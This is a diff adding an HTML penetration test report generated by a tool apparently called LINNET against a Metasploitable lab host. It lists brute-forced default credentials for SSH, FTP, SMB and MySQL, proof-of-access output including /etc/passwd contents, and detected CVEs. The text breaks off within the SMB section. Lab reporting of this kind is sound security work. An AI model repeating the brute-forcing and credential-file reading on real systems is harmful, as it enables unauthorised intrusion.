@@ -1,0 +1,639 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>LINNET — VAPT Report :: 172.20.10.2</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Inter:wght@300;400;500&display=swap');
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0a0c0f;--bg2:#0f1218;--bg3:#141920;--panel:#161c24;
+  --border:#1e2a38;--border2:#243040;
+  --accent:#00d4ff;--red:#ff4d4d;--orange:#ff8c42;--yellow:#ffd166;--green:#06d6a0;
+  --muted:#4a5568;--text:#c8d6e5;--text2:#8899aa;--text3:#556677;
+  --mono:'Share Tech Mono',monospace;--head:'Rajdhani',sans-serif;--body:'Inter',sans-serif;
+}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--body);font-size:14px;line-height:1.7;min-height:100vh}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,212,255,.012) 2px,rgba(0,212,255,.012) 4px);pointer-events:none;z-index:9999}
+.sidebar{position:fixed;left:0;top:0;bottom:0;width:220px;background:var(--bg2);border-right:1px solid var(--border);display:flex;flex-direction:column;z-index:100}
+.sidebar-logo{padding:24px 20px 20px;border-bottom:1px solid var(--border)}
+.sidebar-logo .wordmark{font-family:var(--head);font-size:22px;font-weight:700;letter-spacing:4px;color:var(--accent);text-transform:uppercase}
+.sidebar-logo .sub{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;margin-top:2px;text-transform:uppercase}
+.sidebar-nav{padding:16px 0;flex:1;overflow-y:auto}
+.nav-section-label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:3px;text-transform:uppercase;padding:8px 20px 4px}
+.nav-item{display:flex;align-items:center;gap:10px;padding:8px 20px;color:var(--text2);text-decoration:none;font-size:13px;border-left:2px solid transparent;transition:all .15s}
+.nav-item:hover{color:var(--accent);background:rgba(0,212,255,.04);border-left-color:var(--accent)}
+.nav-dot{width:6px;height:6px;border-radius:50%;background:var(--muted);flex-shrink:0}
+.nav-item:hover .nav-dot{background:var(--accent)}
+.nav-count{margin-left:auto;font-family:var(--mono);font-size:10px;color:var(--text3)}
+.sidebar-footer{padding:16px 20px;border-top:1px solid var(--border);font-family:var(--mono);font-size:10px;color:var(--text3)}
+.main{margin-left:220px;padding:40px 48px;max-width:calc(100vw - 220px)}
+.hero{position:relative;margin-bottom:40px;padding:40px 40px 36px;background:var(--panel);border:1px solid var(--border);border-radius:4px;overflow:hidden}
+.hero::before{content:'VAPT';position:absolute;right:-10px;top:-20px;font-family:var(--head);font-size:140px;font-weight:700;color:rgba(0,212,255,.025);letter-spacing:-4px;pointer-events:none;user-select:none}
+.hero-tag{font-family:var(--mono);font-size:10px;color:var(--accent);letter-spacing:3px;text-transform:uppercase;margin-bottom:12px}
+.hero-title{font-family:var(--head);font-size:42px;font-weight:700;color:#fff;letter-spacing:2px;line-height:1.1;margin-bottom:6px}
+.hero-title span{color:var(--accent)}
+.hero-sub{font-size:13px;color:var(--text2);margin-bottom:28px}
+.hero-meta{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--border);border:1px solid var(--border);border-radius:3px;overflow:hidden}
+.meta-cell{background:var(--bg3);padding:14px 16px}
+.meta-cell .label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:4px}
+.meta-cell .value{font-family:var(--mono);font-size:13px;color:var(--accent)}
+.stats-row{display:grid;grid-template-columns:repeat(6,1fr);gap:12px;margin-bottom:36px}
+.stat-card{background:var(--panel);border:1px solid var(--border);border-radius:3px;padding:18px 16px;position:relative;overflow:hidden}
+.stat-card::after{content:'';position:absolute;bottom:0;left:0;right:0;height:2px;background:var(--card-color,var(--accent));opacity:.7}
+.stat-num{font-family:var(--head);font-size:36px;font-weight:700;color:var(--card-color,var(--accent));line-height:1;margin-bottom:4px}
+.stat-label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase}
+.section{margin-bottom:36px}
+.section-header{display:flex;align-items:center;gap:12px;margin-bottom:16px;padding-bottom:12px;border-bottom:1px solid var(--border)}
+.section-icon{width:28px;height:28px;border:1px solid var(--border2);border-radius:3px;display:flex;align-items:center;justify-content:center;font-size:13px;flex-shrink:0}
+.section-title{font-family:var(--head);font-size:18px;font-weight:600;letter-spacing:2px;text-transform:uppercase;color:#fff}
+.section-badge{margin-left:auto;font-family:var(--mono);font-size:10px;padding:3px 10px;border-radius:2px;letter-spacing:1px}
+.module-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:12px}
+.module-card{background:var(--panel);border:1px solid var(--border);border-radius:3px;overflow:hidden}
+.module-card-header{display:flex;align-items:center;gap:10px;padding:12px 16px;background:var(--bg3);border-bottom:1px solid var(--border)}
+.module-card-header .service-name{font-family:var(--head);font-size:14px;font-weight:600;letter-spacing:2px;text-transform:uppercase}
+.status-pill{margin-left:auto;font-family:var(--mono);font-size:9px;letter-spacing:1px;padding:2px 8px;border-radius:2px;text-transform:uppercase}
+.pill-run{background:rgba(6,214,160,.15);color:var(--green);border:1px solid rgba(6,214,160,.3)}
+.pill-skip{background:rgba(74,85,104,.2);color:var(--muted);border:1px solid rgba(74,85,104,.3)}
+.pill-found{background:rgba(255,77,77,.15);color:var(--red);border:1px solid rgba(255,77,77,.3)}
+.pill-cred{background:rgba(255,209,102,.2);color:var(--yellow);border:1px solid rgba(255,209,102,.4)}
+.module-card-body{padding:14px 16px;font-family:var(--mono);font-size:11px;color:var(--text2);line-height:1.8}
+.finding{display:flex;gap:8px;align-items:flex-start;padding:3px 0}
+.finding-bullet{color:var(--accent);flex-shrink:0;margin-top:1px}
+.cve-table,.cred-table,.postex-table,.proof-table{width:100%;border-collapse:collapse;font-size:12px}
+.cve-table th,.cred-table th,.postex-table th,.proof-table th{font-family:var(--mono);font-size:9px;letter-spacing:2px;text-transform:uppercase;color:var(--text3);padding:8px 12px;text-align:left;border-bottom:1px solid var(--border2);background:var(--bg3)}
+.cve-table td,.cred-table td,.postex-table td,.proof-table td{padding:10px 12px;border-bottom:1px solid var(--border);vertical-align:top}
+.cve-table tr:last-child td,.cred-table tr:last-child td,.postex-table tr:last-child td,.proof-table tr:last-child td{border-bottom:none}
+.cve-table tr:hover td{background:rgba(0,212,255,.025)}
+.cred-table tr:hover td{background:rgba(255,209,102,.04)}
+.postex-table tr:hover td,.proof-table tr:hover td{background:rgba(6,214,160,.04)}
+.cve-id-cell{font-family:var(--mono);color:var(--accent)!important;font-size:11px;white-space:nowrap}
+.cve-link{color:var(--accent);text-decoration:none;border-bottom:1px dashed rgba(0,212,255,.4);transition:color .15s}
+.cve-link:hover{color:#fff;border-bottom-color:#fff}
+.score-badge{display:inline-block;font-family:var(--mono);font-size:10px;font-weight:600;padding:2px 7px;border-radius:2px;min-width:50px;text-align:center}
+.sev-critical{background:rgba(255,77,77,.2);color:#ff4d4d;border:1px solid rgba(255,77,77,.4)}
+.sev-high{background:rgba(255,140,66,.2);color:#ff8c42;border:1px solid rgba(255,140,66,.4)}
+.sev-medium{background:rgba(255,209,102,.2);color:#ffd166;border:1px solid rgba(255,209,102,.4)}
+.sev-low{background:rgba(6,214,160,.15);color:#06d6a0;border:1px solid rgba(6,214,160,.3)}
+.sev-na{background:rgba(74,85,104,.2);color:#4a5568;border:1px solid rgba(74,85,104,.3)}
+.score-bar{width:80px;height:3px;background:var(--border2);border-radius:2px;margin-top:5px;overflow:hidden}
+.score-bar-fill{height:100%;border-radius:2px}
+.cred-user{color:var(--yellow)!important;font-family:var(--mono)}
+.cred-pass{color:var(--red)!important;font-family:var(--mono);font-weight:600}
+.cred-svc{color:var(--accent)!important;font-family:var(--mono)}
+.proof-block{background:#080b0e;border:1px solid var(--border);border-radius:3px;padding:12px 16px;font-family:var(--mono);font-size:11px;color:#8fbc8f;white-space:pre-wrap;word-break:break-all;max-height:180px;overflow-y:auto;line-height:1.7}
+.proof-block::-webkit-scrollbar{width:4px}
+.proof-block::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.proof-tag{display:inline-block;font-family:var(--mono);font-size:9px;padding:2px 7px;border-radius:2px;margin-right:6px;letter-spacing:1px}
+.proof-label{font-family:var(--mono);font-size:9px;color:var(--text3);letter-spacing:2px;text-transform:uppercase;margin-bottom:6px}
+.terminal{background:#080b0e;border:1px solid var(--border);border-radius:3px;overflow:hidden}
+.terminal-bar{background:var(--bg3);border-bottom:1px solid var(--border);padding:8px 14px;display:flex;align-items:center;gap:6px}
+.t-dot{width:8px;height:8px;border-radius:50%}
+.t-red{background:#ff5f57}.t-yellow{background:#ffbd2e}.t-green{background:#28c840}
+.terminal-label{margin-left:8px;font-family:var(--mono);font-size:10px;color:var(--text3);letter-spacing:1px}
+.terminal-body{padding:16px 20px;font-family:var(--mono);font-size:11px;color:#8fbc8f;line-height:2;max-height:300px;overflow-y:auto}
+.terminal-body::-webkit-scrollbar{width:4px}
+.terminal-body::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.t-prompt{color:var(--accent)}.t-cmd{color:var(--text)}
+.file-link{color:var(--green);font-family:var(--mono);font-size:11px}
+.ref-link{color:var(--text3);font-family:var(--mono);font-size:10px;text-decoration:none;border-bottom:1px dashed rgba(85,102,119,.4);transition:all .15s;word-break:break-all}
+.ref-link:hover{color:var(--accent);border-bottom-color:var(--accent)}
+.report-footer{margin-top:48px;padding:20px 0;border-top:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
+.footer-brand{font-family:var(--head);font-size:14px;font-weight:600;letter-spacing:3px;color:var(--accent)}
+.footer-info{font-family:var(--mono);font-size:10px;color:var(--text3);letter-spacing:1px}
+@media print{.sidebar{display:none}.main{margin-left:0;padding:20px}body::before{display:none}}
+</style>
+</head>
+<body>
+<nav class="sidebar">
+  <div class="sidebar-logo">
+    <div class="wordmark">LINNET</div>
+    <div class="sub">VAPT Report</div>
+  </div>
+  <div class="sidebar-nav">
+    <div class="nav-section-label">Navigation</div>
+    <a class="nav-item" href="#overview"><span class="nav-dot"></span>Overview</a>
+    <a class="nav-item" href="#modules"><span class="nav-dot"></span>Modules <span class="nav-count">5</span></a>
+    <a class="nav-item" href="#creds"><span class="nav-dot" style="background:var(--yellow)"></span>Credentials <span class="nav-count">10</span></a>
+    <a class="nav-item" href="#proof"><span class="nav-dot" style="background:var(--green)"></span>Proof of Access <span class="nav-count">10</span></a>
+    
+    <a class="nav-item" href="#cves"><span class="nav-dot" style="background:var(--red)"></span>CVE Findings <span class="nav-count">16</span></a>
+    <a class="nav-item" href="#commands"><span class="nav-dot"></span>Commands <span class="nav-count">31</span></a>
+    <div class="nav-section-label" style="margin-top:12px;">Severity</div>
+    <a class="nav-item" href="#cves"><span class="nav-dot" style="background:#ff4d4d"></span>Critical / High</a>
+    <a class="nav-item" href="#cves"><span class="nav-dot" style="background:#ffd166"></span>Medium / Low</a>
+  </div>
+  <div class="sidebar-footer">Generated 2026-04-20 10:56:34<br/>LINNET v2.1 &mdash; NVD API + paramiko</div>
+</nav>
+<main class="main">
+  <div class="hero" id="overview">
+    <div class="hero-tag">// Vulnerability Assessment &amp; Penetration Test Report</div>
+    <div class="hero-title">SECURITY<br/><span>ASSESSMENT</span></div>
+    <div class="hero-sub">Automated enumeration, CVE correlation &amp; post-exploitation — LINNET Framework v2.1</div>
+    <div class="hero-meta">
+      <div class="meta-cell"><div class="label">Target</div><div class="value">172.20.10.2</div></div>
+      <div class="meta-cell"><div class="label">Start Time</div><div class="value">2026-04-20 10:48:33</div></div>
+      <div class="meta-cell"><div class="label">End Time</div><div class="value">2026-04-20 10:56:34</div></div>
+      <div class="meta-cell"><div class="label">Report ID</div><div class="value">LNT-20260420-105634</div></div>
+    </div>
+  </div>
+  <div class="stats-row">
+    <div class="stat-card" style="--card-color:var(--red)"><div class="stat-num">2</div><div class="stat-label">Critical</div></div>
+    <div class="stat-card" style="--card-color:var(--orange)"><div class="stat-num">5</div><div class="stat-label">High</div></div>
+    <div class="stat-card" style="--card-color:var(--yellow)"><div class="stat-num">6</div><div class="stat-label">Medium</div></div>
+    <div class="stat-card" style="--card-color:var(--green)"><div class="stat-num">2</div><div class="stat-label">Low</div></div>
+    <div class="stat-card" style="--card-color:var(--accent)"><div class="stat-num">5</div><div class="stat-label">Modules</div></div>
+    <div class="stat-card" style="--card-color:var(--yellow)"><div class="stat-num">10</div><div class="stat-label">Creds Found</div></div>
+  </div>
+  <div class="section" id="modules">
+    <div class="section-header">
+      <div class="section-icon">⚙</div>
+      <div class="section-title">Modules Executed</div>
+      <span class="section-badge pill-run">5 TOTAL</span>
+    </div>
+    <div class="module-grid">
+    <div class="module-card">
+      <div class="module-card-header">
+        <span style="font-size:16px">🔐</span>
+        <span class="service-name">SSH</span>
+        <span class="status-pill pill-run">RUN</span>
+      </div>
+      <div class="module-card-body"><div class="finding"><span class="finding-bullet">›</span><span>Brute-force complete — 4 credential(s) found</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: id=uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin) hostname=metasploitable</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: id=uid=1001(user) gid=1001(user) groups=1001(user) hostname=metasploitable</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: id=uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres) hostname=metasploitable</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: id=uid=1002(service) gid=1002(service) groups=1002(service) hostname=metasploitable</span></div></div>
+    </div>
+    <div class="module-card">
+      <div class="module-card-header">
+        <span style="font-size:16px">📂</span>
+        <span class="service-name">FTP</span>
+        <span class="status-pill pill-run">RUN</span>
+      </div>
+      <div class="module-card-body"><div class="finding"><span class="finding-bullet">›</span><span>Brute-force complete — 4 credential(s) found</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: FTP listing obtained (1 entries)</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: FTP listing obtained (0 entries)</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: FTP listing obtained (1 entries)</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: FTP listing obtained (0 entries)</span></div></div>
+    </div>
+    <div class="module-card">
+      <div class="module-card-header">
+        <span style="font-size:16px">🖧</span>
+        <span class="service-name">SMB</span>
+        <span class="status-pill pill-run">RUN</span>
+      </div>
+      <div class="module-card-body"><div class="finding"><span class="finding-bullet">›</span><span>enum4linux -a executed</span></div><div class="finding"><span class="finding-bullet">›</span><span>CrackMapExec complete — 1 credential(s) found</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: SMB share listing obtained</span></div></div>
+    </div>
+    <div class="module-card">
+      <div class="module-card-header">
+        <span style="font-size:16px">🗄</span>
+        <span class="service-name">MySQL</span>
+        <span class="status-pill pill-run">RUN</span>
+      </div>
+      <div class="module-card-body"><div class="finding"><span class="finding-bullet">›</span><span>mysql-info + mysql-enum executed</span></div><div class="finding"><span class="finding-bullet">›</span><span>Medusa complete — 1 credential(s) found</span></div><div class="finding"><span class="finding-bullet">›</span><span>✓ PROOF: MySQL access confirmed, version=</span></div></div>
+    </div>
+    <div class="module-card">
+      <div class="module-card-header">
+        <span style="font-size:16px">🛡</span>
+        <span class="service-name">CVE</span>
+        <span class="status-pill pill-run">RUN</span>
+      </div>
+      <div class="module-card-body"><div class="finding"><span class="finding-bullet">›</span><span>Detected: ProFTPD 1.3.1, OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0), Linux telnetd, Postfix smtpd, ISC BIND 9.4.2</span></div><div class="finding"><span class="finding-bullet">›</span><span>Top CVEs: CVE-2021-27171, CVE-2020-1938, CVE-2024-54141, CVE-2009-0542, CVE-2000-1195</span></div><div class="finding"><span class="finding-bullet">›</span><span>Total: 16 CVEs found</span></div></div>
+    </div></div>
+  </div>
+  
+  <div class="section" id="creds">
+    <div class="section-header">
+      <div class="section-icon">🔑</div>
+      <div class="section-title">Credentials Found</div>
+      <span class="section-badge pill-cred">10 CREDS</span>
+    </div>
+    <div style="background:var(--panel);border:1px solid rgba(255,209,102,.25);border-radius:3px;overflow:hidden;">
+      <table class="cred-table">
+        <thead><tr><th>Service</th><th>Username</th><th>Password</th><th>Target</th><th>Time</th></tr></thead>
+        <tbody><tr>
+      <td class="cred-svc">SSH</td>
+      <td class="cred-user">msfadmin</td>
+      <td class="cred-pass">msfadmin</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:50:17</td>
+    </tr><tr>
+      <td class="cred-svc">SSH</td>
+      <td class="cred-user">user</td>
+      <td class="cred-pass">user</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:50:17</td>
+    </tr><tr>
+      <td class="cred-svc">SSH</td>
+      <td class="cred-user">postgres</td>
+      <td class="cred-pass">postgres</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:50:17</td>
+    </tr><tr>
+      <td class="cred-svc">SSH</td>
+      <td class="cred-user">service</td>
+      <td class="cred-pass">service</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:50:17</td>
+    </tr><tr>
+      <td class="cred-svc">FTP</td>
+      <td class="cred-user">msfadmin</td>
+      <td class="cred-pass">msfadmin</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:52:28</td>
+    </tr><tr>
+      <td class="cred-svc">FTP</td>
+      <td class="cred-user">user</td>
+      <td class="cred-pass">user</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:52:28</td>
+    </tr><tr>
+      <td class="cred-svc">FTP</td>
+      <td class="cred-user">postgres</td>
+      <td class="cred-pass">postgres</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:52:28</td>
+    </tr><tr>
+      <td class="cred-svc">FTP</td>
+      <td class="cred-user">service</td>
+      <td class="cred-pass">service</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:52:28</td>
+    </tr><tr>
+      <td class="cred-svc">SMB</td>
+      <td class="cred-user">msfadmin</td>
+      <td class="cred-pass">msfadmin</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:55:03</td>
+    </tr><tr>
+      <td class="cred-svc">MySQL</td>
+      <td class="cred-user">root</td>
+      <td class="cred-pass">root</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">172.20.10.2</td>
+      <td style="color:var(--text3);font-family:var(--mono);font-size:11px">10:55:35</td>
+    </tr></tbody>
+      </table>
+    </div>
+  </div>
+  
+  <div class="section" id="proof">
+    <div class="section-header">
+      <div class="section-icon">✅</div>
+      <div class="section-title">Proof of Access</div>
+      <span class="section-badge pill-cred">10 SERVICE(S)</span>
+    </div>
+    <div class="module-grid">
+            <div class="module-card" style="border-color:rgba(0,212,255,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(0,212,255,.3)">
+                <span style="font-size:16px">🔐</span>
+                <span class="service-name" style="color:#00d4ff">SSH</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">msfadmin</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">System Identity</div>
+                <div class="proof-block">uid=1000(msfadmin) gid=1000(msfadmin) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),107(fuse),111(lpadmin),112(admin),119(sambashare),1000(msfadmin)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</div>
+                <div class="proof-label" style="margin-top:10px">Network</div>
+                <div class="proof-block">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1</div>
+                <div class="proof-label" style="margin-top:10px">/etc/passwd (tail)</div>
+                <div class="proof-block">distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(0,212,255,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(0,212,255,.3)">
+                <span style="font-size:16px">🔐</span>
+                <span class="service-name" style="color:#00d4ff">SSH</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">user</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">System Identity</div>
+                <div class="proof-block">uid=1001(user) gid=1001(user) groups=1001(user)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</div>
+                <div class="proof-label" style="margin-top:10px">Network</div>
+                <div class="proof-block">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1</div>
+                <div class="proof-label" style="margin-top:10px">/etc/passwd (tail)</div>
+                <div class="proof-block">distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(0,212,255,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(0,212,255,.3)">
+                <span style="font-size:16px">🔐</span>
+                <span class="service-name" style="color:#00d4ff">SSH</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">postgres</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">System Identity</div>
+                <div class="proof-block">uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</div>
+                <div class="proof-label" style="margin-top:10px">Network</div>
+                <div class="proof-block">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1</div>
+                <div class="proof-label" style="margin-top:10px">/etc/passwd (tail)</div>
+                <div class="proof-block">distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(0,212,255,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(0,212,255,.3)">
+                <span style="font-size:16px">🔐</span>
+                <span class="service-name" style="color:#00d4ff">SSH</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">service</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">System Identity</div>
+                <div class="proof-block">uid=1002(service) gid=1002(service) groups=1002(service)
+Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux</div>
+                <div class="proof-label" style="margin-top:10px">Network</div>
+                <div class="proof-block">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue 
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1</div>
+                <div class="proof-label" style="margin-top:10px">/etc/passwd (tail)</div>
+                <div class="proof-block">distccd:x:111:65534::/:/bin/false
+user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
+service:x:1002:1002:,,,:/home/service:/bin/bash
+telnetd:x:112:120::/nonexistent:/bin/false
+proftpd:x:113:65534::/var/run/proftpd:/bin/false</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(255,209,102,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(255,209,102,.3)">
+                <span style="font-size:16px">📂</span>
+                <span class="service-name" style="color:#ffd166">FTP</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">msfadmin</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">Welcome Banner</div>
+                <div class="proof-block">220 ProFTPD 1.3.1 Server (Debian) [::ffff:172.20.10.2]</div>
+                <div class="proof-label" style="margin-top:10px">Directory Listing (pwd: /home/msfadmin) </div>
+                <div class="proof-block">drwxr-xr-x   6 msfadmin msfadmin     4096 Apr 28  2010 vulnerable</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(255,209,102,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(255,209,102,.3)">
+                <span style="font-size:16px">📂</span>
+                <span class="service-name" style="color:#ffd166">FTP</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">user</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">Welcome Banner</div>
+                <div class="proof-block">220 ProFTPD 1.3.1 Server (Debian) [::ffff:172.20.10.2]</div>
+                <div class="proof-label" style="margin-top:10px">Directory Listing (pwd: /home/user) </div>
+                <div class="proof-block">(empty listing)</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(255,209,102,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(255,209,102,.3)">
+                <span style="font-size:16px">📂</span>
+                <span class="service-name" style="color:#ffd166">FTP</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">postgres</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">Welcome Banner</div>
+                <div class="proof-block">220 ProFTPD 1.3.1 Server (Debian) [::ffff:172.20.10.2]</div>
+                <div class="proof-label" style="margin-top:10px">Directory Listing (pwd: /var/lib/postgresql) </div>
+                <div class="proof-block">drwxr-xr-x   3 root     root         4096 Mar 17  2010 8.3</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(255,209,102,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(255,209,102,.3)">
+                <span style="font-size:16px">📂</span>
+                <span class="service-name" style="color:#ffd166">FTP</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">service</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">Welcome Banner</div>
+                <div class="proof-block">220 ProFTPD 1.3.1 Server (Debian) [::ffff:172.20.10.2]</div>
+                <div class="proof-label" style="margin-top:10px">Directory Listing (pwd: /home/service) </div>
+                <div class="proof-block">(empty listing)</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(255,140,66,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(255,140,66,.3)">
+                <span style="font-size:16px">🖧</span>
+                <span class="service-name" style="color:#ff8c42">SMB</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">msfadmin</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">Share Listing</div>
+                <div class="proof-block">session setup failed: NT_STATUS_LOGON_FAILURE
+
